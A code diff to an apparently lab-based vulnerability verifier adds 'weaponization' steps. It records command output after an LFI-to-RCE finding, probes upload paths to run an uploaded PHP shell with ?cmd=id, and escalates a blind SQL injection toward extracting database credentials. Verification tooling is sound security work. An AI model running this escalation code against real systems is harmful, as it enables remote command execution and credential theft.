@@ -3212,6 +3212,18 @@ def verify_generic_lfi_rce(
                                 f"Marcador: {marker}\n"
                                 f"Respuesta:\n{_body[:300]}"),
             )
+            # Weaponization entry
+            _lfi_rce_id = _id_out or _who_out or ""
+            if _lfi_rce_id or _uname_out:
+                res.evidence["weaponization"] = {
+                    "technique": "lfi_rce_log_poisoning",
+                    "data": {k: v for k, v in [
+                        ("id_output", _id_out), ("whoami_output", _who_out),
+                        ("uname_output", _uname_out)] if v},
+                    "impact": (f"LFI-to-RCE via log poisoning — OS command execution: "
+                               f"id={_lfi_rce_id[:60]}" if _lfi_rce_id else
+                               f"LFI-to-RCE via log poisoning — {_uname_out[:60]}"),
+                }
         else:
             any_raw = any(t.get("reflejado_crudo_sin_ejecutar") for t in tried)
             res.ok = True
@@ -3495,6 +3507,16 @@ def verify_generic_file_upload(
                             f"with canary secret."),
                 extra_terminal=_file_body,
             )
+            # Weaponization: attempt to execute the uploaded PHP shell via HTTP
+            # Try common WordPress upload paths where shell may be accessible
+            _shell_name = res.evidence.get("fichero_ganador", "")
+            _shell_path_in_container = res.evidence.get("ruta_real_en_el_contenedor", "")
+            if _shell_name and ".php" in _shell_name.lower():
+                _shell_wep = _try_execute_uploaded_shell(
+                    base_url=base_url, shell_name=_shell_name,
+                    container_path=_shell_path_in_container, step=step)
+                if _shell_wep.get("impact"):
+                    res.evidence["weaponization"] = _shell_wep
         else:
             res.ok = True
             res.detail = (f"se probaron {len(tried)} nombres/extensiones de fichero contra "
@@ -4941,6 +4963,25 @@ def verify_generic_sqli_blind(
                 res.evidence["screenshots"] = shots
             if http_caps:
                 res.evidence["http_captures"] = http_caps
+            # Weaponization: escalate confirmed SQLi → extract DB version / credentials
+            if not res.evidence.get("weaponization"):
+                try:
+                    _sqli_payload_ganador = res.evidence.get("payload_ganador", "")
+                    _sqli_wep = _try_weaponize_generic(
+                        base_url=base_url,
+                        endpoint=endpoint_path,
+                        method=m,
+                        query_params={sqli_param: _sqli_payload_ganador} if m == "GET" else None,
+                        post_data={sqli_param: _sqli_payload_ganador} if m != "GET" else None,
+                        hdrs=custom_headers or {},
+                        confirm_string="",
+                        vuln_class="sqli",
+                        step=step,
+                    )
+                    if _sqli_wep.get("impact"):
+                        res.evidence["weaponization"] = _sqli_wep
+                except Exception:
+                    pass
         else:
             res.ok = True
             res.detail = (f"se probaron {len(tried)} combinaciones de contexto/dialecto de "
@@ -7611,6 +7652,66 @@ def verify_generic_cors_misconfig(
         step("desmontando el laboratorio generico...")
         if lab is not None:
             lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# Post-verification weaponization helpers
+# ---------------------------------------------------------------------------
+
+def _try_execute_uploaded_shell(base_url: str, shell_name: str, container_path: str,
+                                 step) -> dict:
+    """After file upload is confirmed (shell saved on disk), try to execute it via HTTP.
+
+    Probes common WordPress/generic upload URL paths to find where the server
+    exposes the uploaded file, then sends ?cmd=id to confirm RCE.
+    Returns weaponization dict or {}.
+    """
+    try:
+        import requests as _req
+        import re as _re
+        sess = _req.Session()
+        sess.headers["User-Agent"] = "binoracle-weaponize"
+        # Common paths where WordPress and generic apps serve uploaded files
+        _upload_paths = [
+            f"/wp-content/uploads/{shell_name}",
+            f"/wp-content/uploads/2024/{shell_name}",
+            f"/wp-content/uploads/2025/{shell_name}",
+            f"/uploads/{shell_name}",
+            f"/upload/{shell_name}",
+            f"/files/{shell_name}",
+            f"/media/{shell_name}",
+            f"/{shell_name}",
+        ]
+        # Also derive path from container_path if available
+        if container_path:
+            # e.g. /var/www/html/wp-content/uploads/shell.php → /wp-content/uploads/shell.php
+            for _prefix in ("/var/www/html", "/var/www", "/srv/http", "/app"):
+                if container_path.startswith(_prefix):
+                    _derived = container_path[len(_prefix):]
+                    if _derived not in _upload_paths:
+                        _upload_paths.insert(0, _derived)
+        step(f"weaponize/file-upload: probando {len(_upload_paths)} rutas para ejecutar shell...")
+        for path in _upload_paths:
+            try:
+                # First check if reachable
+                url_check = base_url.rstrip("/") + path
+                r = sess.get(url_check, params={"cmd": "id"}, timeout=8, allow_redirects=True)
+                if r.status_code == 200:
+                    uid_m = _re.search(r'uid=\d+\(([^\)]+)\)', r.text)
+                    if uid_m:
+                        step(f"weaponize/file-upload: RCE confirmado — {uid_m.group(0)} via {path}")
+                        return {
+                            "technique": "file_upload_rce",
+                            "data": {"shell_path": path, "id_output": uid_m.group(0),
+                                     "shell_url": url_check},
+                            "impact": (f"File upload RCE confirmed — OS command execution via "
+                                       f"{path}: {uid_m.group(0)}"),
+                        }
+            except Exception:
+                continue
+    except Exception:
+        pass
+    return {}
 
 
 # ---------------------------------------------------------------------------
